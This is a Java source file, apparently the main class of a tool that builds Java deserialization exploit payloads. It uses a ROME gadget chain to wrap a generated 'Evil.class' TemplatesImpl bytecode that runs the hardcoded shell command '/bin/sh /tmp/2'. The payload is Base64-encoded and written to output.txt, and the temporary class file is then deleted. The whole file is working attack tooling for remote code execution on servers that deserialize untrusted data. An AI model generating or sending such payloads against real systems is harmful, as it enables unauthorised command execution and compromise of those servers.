package org.sec;

import org.sec.asm.Resolver;
import org.sec.payload.*;

import java.io.File;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Locale;

public class Main {
    private static String gadgetName;
    private static String command;
    private static boolean debug = false;

    public static void main(String[] args) throws Exception {
        resolveTemplatesPayload(ROME.class, "/bin/sh /tmp/2", debug);
    }



    private static void resolveNormalPayload(Class<?> target,
                                             String command, boolean debug) throws Exception {
        Method method = target.getMethod("getPayloadUseCommand", String.class);
        byte[] payload = (byte[]) method.invoke(null, command);
        byte[] data = Base64.getEncoder().encode(payload);
        System.out.println("Payload length: " + new String(data).length());
        System.out.println("Write Base64 Payload output.txt...");
        Files.write(Paths.get("output.txt"), data);
        if (debug) {
            Payload.deserialize(Base64.getDecoder().decode(data));
        }
    }

    @SuppressWarnings("all")
    private static void resolveTemplatesPayload(Class<?> target,
                                                String command, boolean debug) throws Exception {
        String path = System.getProperty("user.dir") + File.separator + "Evil.class";
        Generator.saveTemplateImpl(path, command);
        Resolver.resolve("Evil.class");
        byte[] newByteCodes = Files.readAllBytes(Paths.get("Evil.class"));
        Method method = target.getMethod("getPayloadUseByteCodes", byte[].class);
        byte[] payload = Base64.getEncoder().encode((byte[]) method.invoke(null, newByteCodes));
        System.out.println("Payload length: " + new String(payload).length());
        System.out.println("Write Base64 Payload output.txt...");
        Files.write(Paths.get("output.txt"), payload);
        if (debug) {
            Payload.deserialize(Base64.getDecoder().decode(payload));
        }
        Files.delete(Paths.get("Evil.class"));
    }
}
